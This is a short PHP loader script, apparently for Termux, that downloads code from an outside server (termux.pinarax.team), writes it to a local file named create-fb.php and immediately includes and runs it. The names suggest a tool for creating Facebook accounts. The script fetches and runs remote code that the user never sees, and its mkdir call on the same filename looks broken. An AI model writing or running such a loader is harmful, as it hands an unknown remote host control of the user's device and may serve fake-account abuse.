<?php

//ini_set('display_errors', "0");

$get_start = file_get_contents('https://termux.pinarax.team/fb/api.php?action=start');
if($get_start) {
    if(file_exists('create-fb.php')) {} else {
        mkdir('create-fb.php', 0777, true);
    }
    $pinarax_file = fopen('create-fb.php', 'w');
    fwrite($pinarax_file, $get_start);
    system('clear');
    include 'create-fb.php';
    pinarax_start();
}
